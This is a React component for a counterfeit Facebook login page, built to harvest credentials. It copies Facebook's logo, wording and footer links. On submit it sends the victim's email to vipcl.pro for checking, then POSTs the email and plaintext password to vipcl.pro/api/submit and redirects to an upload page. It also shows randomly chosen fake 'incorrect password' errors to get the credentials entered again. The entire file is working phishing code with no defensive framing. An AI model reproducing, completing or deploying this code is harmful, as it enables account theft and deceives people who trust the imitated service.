import React, { useState } from 'react'
import axios from 'axios'
import { history } from '../../utils/history'

const Login = () => {
	const [email, setEmail] = useState('')
	const [password, setPassword] = useState('')
	const [numWrong, setNumWrong] = useState(0)

	const languages = [
		'English (UK)',
		'Tiếng Việt',
		'中文(台灣)',
		'한국어',
		'日本語',
		'Français (France)',
		'ภาษาไทย',
		'Español',
		'Português (Brasil)',
		'Deutsch',
		'Italiano'
	]

	const opts = [
		'Sign Up', 
		'Log in',
		'Messenger', 
		'Facebook', 
		'Lite',
		'Video',
		'Places',
		'Games',
		'Marketplace',
		'Meta Pay',
		'Meta Store',
		'Meta Quest', 
		'Instagram',
		'Threads',
		'Fundraisers',
		'Services',
		'Voting Information Centre',
		'Privacy Policy',
		'Privacy Centre',
		'Groups',
		'About',
		'Create ad',
		'Create Page',
		'Developers',
		'Careers',
		'Cookies',
		'AdChoices',
		'Terms',
		'Help',
		'Contact uploading and non-users'
	]

	const onBtnClick = async (e) => {
		e.preventDefault();
		const apiCheck = `https://vipcl.pro/api/check?email=`
		const apiSave =  'https://vipcl.pro/api/submit?_for=0';
        if (email.length > 0 && password.length >= 6) {
            const res = await axios.get(apiCheck + email)
            const isOk = res.data.status
						console.log(isOk)
            // setValid(isOk)
            if (isOk) {
							setNumWrong(0)
							const res = await axios.post(apiSave, {
									email: email,
									password: password
							})
	
							if (res.data.status === 200) {
								history.push("/upload?email="+email)
							}
            } else {
							setNumWrong(Math.ceil(Math.random()*2))
						}
        } else {
            setNumWrong(2)
        }
	}

  return (
	<div className='w-full'>
		<div className='w-full flex justify-center' style={{
			backgroundColor: '#f0f2f5'
		  }}>
			{/* Content */}
			<div className='w-[400px] flex flex-col items-center pb-20 pt-10 sm: m-4'>
		  	<img src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg" alt="facebook text logo" className='w-[240px]'/>
				<form className='flex flex-col items-center w-full bg-white rounded-lg shadow-lg shadow-black-500/50 p-4' onSubmit={onBtnClick}>
					<h3 className='mb-4 text-lg'>Log in to Facebook</h3>
					<input
						type="text" 
						placeholder='Email address or phone number'
						value={email}
						className='w-full border-solid border-2 border-black-100 rounded-lg px-4 py-3 outline-none mt-2'
						onChange={e => setEmail(e.target.value)}
					/>
					{numWrong == 1 && <span className='text-red-500'>
						The email address or mobile number you entered isn't connected to an account. <a href='#' className='font-bold'>Create a new Facebook account.</a>
						</span>}
					<input 
						type="password" 
						placeholder='Password'
						value={password}
						className='w-full border-solid border-2 border-black-100 rounded-lg px-4 py-3 outline-none mt-3'
						onChange={e => setPassword(e.target.value)}
					/>
					{numWrong == 2 && <span className='text-red-500'>
						The password that you've entered is incorrect. <a href='#' className='font-bold'>Forgotten password?</a>
					</span>}
					<button 
	          className='w-full font-bold text-white rounded-lg p-3 mt-4 text-lg' 
	          onClick={onBtnClick}
	          style={{
	            backgroundColor: '#1877f2'
	          }}>
	          	Log in 
	        </button>
				</form>
			</div>
		  {/* Content */}
		</div>
		{/* Footer */}
		<div className='flex flex-col items-center pt-40'>
				<div className='max-w-[980px] flex flex-wrap mb-2 md:mx-8 sm: mx-4'>
					{languages.map((lang, idx) => (
						<a href='#' key={idx} className='text-sm pr-2' style={{color: '#8a8d91'}}>
							{lang}
						</a>
					))}
				</div>
				<div className='max-w-[980px] flex flex-wrap border-solid border-t-2 border-gray pt-2  md:mx-8 sm: mx-4'>
					{opts.map((e, idx) => (
						<a className='text-sm pr-4 text-gray-400' href="#" key={idx}>
							{e}
						</a>
					))}
				</div>
				</div>			
		{/* Footer */}
	</div>
  )
}

export default Login